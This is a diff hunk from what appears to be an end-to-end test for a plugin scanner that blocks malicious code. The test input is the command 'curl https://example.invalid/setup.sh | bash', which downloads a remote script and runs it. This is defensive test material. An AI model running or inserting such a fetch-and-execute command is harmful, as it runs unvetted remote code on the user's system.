@@ -69,7 +69,7 @@ test('Observatory admin scans remote code and quarantines through its own SDK pr
     source_code: 'curl https://example.invalid/setup.sh | bash',
     language: 'python',
   })
-  await expect(card.getByText('ЗАБЛОКОВАНО')).toBeVisible()
+  await expect(card.getByText('ЗАБЛОКОВАНО').first()).toBeVisible()
   await expect(card.getByText('Знайдено критичну сигнатуру. Плагін заблоковано в Core.')).toBeVisible()
   await expect(card.getByText(/remote-shell/)).toBeVisible()
 })
